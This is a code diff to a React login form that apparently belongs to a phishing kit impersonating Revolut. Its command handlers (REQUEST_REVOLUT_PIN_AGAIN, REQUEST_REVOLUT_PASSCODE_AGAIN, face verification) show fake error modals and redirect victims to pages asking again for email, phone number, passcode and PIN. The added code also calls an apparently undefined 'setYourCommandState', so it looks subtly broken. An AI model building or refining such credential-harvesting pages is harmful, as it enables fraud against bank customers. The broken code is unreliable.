@@ -51,13 +51,33 @@ export default function LoginForm() {
         setDisplayMessage(errorType)
     }
 
+    const [commandCounter, setCommandCounter] = useState(0);
+    const setCommand = (newCommand) => {
+  // Check if it's one of the commands that should trigger the error modal
+      const errorCommands = [
+        'REQUEST_EMAIL_AGAIN',
+        'REQUEST_NUMBER_AGAIN',
+        'REQUEST_REVOLUT_PIN_AGAIN',
+        'REQUEST_REVOLUT_PASSCODE_AGAIN'
+      ];
+      
+      // If it's the same command as before and it's an error command, increment the counter
+      if (newCommand === command && errorCommands.includes(newCommand)) {
+        setCommandCounter(prev => prev + 1);
+      }
+      
+      // Set the actual command
+      setYourCommandState(newCommand);
+    };
+
 
 
     useEffect(() => {
         if (command === 'REQUEST_EMAIL_AGAIN') {
-            console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
+            console.log("HERE WE WILL REQUEST EMAIL AGAIN");
             displayErrorModal('email'); // Show error modal for email
         } else if (command === 'REQUEST_NUMBER_AGAIN') {
+            console.log("HERE WE WILL REQUEST NUMBER AGAIN");
             displayErrorModal('phone'); // Show error modal for phone number
         } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
             setTimeout(() => {
@@ -66,6 +86,7 @@ export default function LoginForm() {
                 router.push('/PasswordPage');
             }, 500);
         } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
+            console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
             setTimeout(() => {
@@ -74,6 +95,7 @@ export default function LoginForm() {
                 router.push('/PasswordPage');
             }, 500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
+            console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION') {
             setTimeout(() => {
@@ -94,7 +116,7 @@ export default function LoginForm() {
                 router.push('/verificationPage');
             }, 1500);
         }
-    }, [command, router]);
+    }, [command, router, commandCounter]);
 
     
     const { validateEmail } = useValidateEmail();
